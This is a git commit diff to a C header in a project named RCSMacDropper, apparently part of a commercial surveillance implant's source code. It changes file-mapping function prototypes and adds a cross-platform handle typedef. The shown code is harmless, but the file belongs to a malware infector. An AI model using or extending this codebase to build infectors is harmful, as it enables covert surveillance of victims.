6ca1220e1d73f3b024247568ad101c8b02f0e145
rev <rev@30e694c7-159d-4bd8-ba75-215c342f8d20>
2009-11-30 09:05:45 +0000

    FIX: fixed cross-compile typedef
    git-svn-id: http://rcs-dev/svn/rcs/RCSBuilder@1183 30e694c7-159d-4bd8-ba75-215c342f8d20

--- RCSMacDropper/RCSMacInfectorUtil.h
+++ RCSMacDropper/RCSMacInfectorUtil.h
@@ -1,10 +1,10 @@
 /*
- *  RCSMacDropperUtil.h
- *  
+ * RCSMacDropperUtil.h 
  *
- *  Created by revenge on 7/20/09.
- *  Win32 porting by Massimo Chiodini on 02/11/2009
- *  Copyright 2009 __MyCompanyName__. All rights reserved.
+ * Created by Alfredo 'revenge' Pesoli on 20/07/2009.
+ * Win32 porting by Massimo Chiodini on 02/11/2009
+ *
+ * Copyright (C) HT srl 2009. All rights reserved
  *
  */
 #ifdef WIN32
@@ -14,14 +14,14 @@
 #endif
 
 #include "RCSMacInfectorErrors.h"
+#include "RCSMacCommon.h"
 
-
-void *allocate (size_t);
-//char *mapFile (char *, int *, int *, int *);
 #ifdef WIN32
-char *
-mapFile (char *filename, int *fileSize, HANDLE *fd, HANDLE *fdMap, int *padding);
+typedef HANDLE _mHandle;
 #else
-char *
-mapFile (char *filename, int *fileSize, int *fd, int *padding);
+typedef int _mHandle;
 #endif
+
+
+void *allocate (mSize_t);
+char *mapFile (char *, int *, _mHandle *, _mHandle *, int *);
